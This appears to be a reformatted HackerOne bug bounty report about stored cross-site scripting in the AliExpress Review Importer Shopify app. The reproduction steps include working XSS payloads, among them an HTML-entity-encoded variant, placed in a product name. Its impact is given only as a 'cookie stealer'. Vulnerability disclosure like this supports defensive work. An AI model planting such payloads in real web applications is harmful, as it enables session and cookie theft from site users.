# stored XSS on AliExpress Review Importer/Products when delete product

## Metadata
- **Source:** HackerOne
- **Report:** 1425882 | https://hackerone.com/reports/1425882
- **Submitted:** 2021-12-14
- **Reporter:** chupa__chups
- **Program:** Unknown
- **Bounty:** $500
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Stored
- **CVEs:** None
- **Category:** web-api

## Summary
Hi @judgeme!
`code`
Step to reproduce:

1. Go to Shopify admin and create product with name `">&#60;"><img src=x onerror=prompt(document.domain)> img src=x onerror=prompt(&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;)>`

2. Go to AliExpress Review Importer/Products and delete our product with name ` 	"><"><img src=x onerror=prompt(document.domain)> img src

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi @judgeme!
`code`
Step to reproduce:

1. Go to Shopify admin and create product with name `">&#60;"><img src=x onerror=prompt(document.domain)> img src=x onerror=prompt(&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;)>`

2. Go to AliExpress Review Importer/Products and delete our product with name ` 	"><"><img src=x onerror=prompt(document.domain)> img src=x onerror=prompt(document.domain)> `

{F1544890}
3. Xss work=)


P.S. Poc wideo attach


{F1544893}

## Impact

cookie stealer

</details>

---
*Analysed by Claude on 2026-05-24*
